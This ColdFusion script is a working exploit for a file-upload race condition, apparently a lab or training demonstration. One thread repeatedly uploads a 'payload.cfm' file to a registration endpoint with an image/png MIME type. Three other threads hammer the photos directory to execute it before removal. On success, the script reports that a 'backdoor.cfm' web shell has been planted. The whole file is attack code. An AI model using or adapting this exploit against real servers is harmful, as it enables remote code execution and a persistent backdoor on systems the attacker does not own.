<cfset application.hacked = false>
<cfset reqUrl = getPageContext().getRequest().getRequestURL()>
<cfset uploadUrl = replaceNoCase(reqUrl, cgi.script_name, "/my-account/register.cfm")>
<cfset photoUrl = replaceNoCase(reqUrl, cgi.script_name, "/my-account/photos/payload.cfm")>

<cfset application.loadReqCount = 0>

<!--- upload our payload cfm file --->
<cfthread name="uploadThread" action="run" priority="LOW" uploadUrl="#uploadUrl#">
	<cfloop from="1" to="50" index="i">
		<cflock type="readonly" name="loadAttack" timeout="5">
			<cfif application.hacked>
				<cfbreak>
			</cfif>
		</cflock>
		<cfhttp url="#uploadUrl#" method="POST">
			<cfhttpparam type="file" name="photo" mimetype="image/png" file="#expandPath("./payload.cfm")#"> 
		</cfhttp>
	</cfloop>
</cfthread>

<!--- create 3 threads to request payload.cfm --->
<cfloop from="1" to="3" index="n">
	<cfthread name="hitPayload#n#" action="run" priority="HIGH" photoUrl="#photoUrl#">
		<cfloop from="1" to="50" index="i">
			<cflock type="readonly" name="loadAttack" timeout="5">
				<cfif application.hacked>
					<cfbreak>
				</cfif>
			</cflock>
			<cfhttp url="#photoUrl#" method="GET" result="response"></cfhttp>
			<cflock name="loadAttackCount" timeout="5" type="exclusive">
				<cfset application.loadReqCount = application.loadReqCount + 1>
			</cflock>
			<cfif response.fileContent contains "We now control the server!">
				<cflock type="exclusive" name="loadAttack" timeout="10">
					<cfset application.hacked = true>
				</cflock>
				<cfbreak>
			</cfif>
			
		</cfloop>
	</cfthread>
</cfloop>


<cfthread action="join" name="uploadThread,hitPayload1,hitPayload2,hitPayload3" />
<cfif application.hacked>
	<div class="alert alert-success">Successfully uploaded and executed the payload</div>
	<p class="lead">There should now be a <a href="/my-account/photos/backdoor.cfm">backdoor.cfm</a> in the photos directory.</p>	
<cfelse>
	<div class="alert alert-warning">Failed</div>
</cfif>
<cfoutput>Request Count: #application.loadReqCount#</cfoutput>
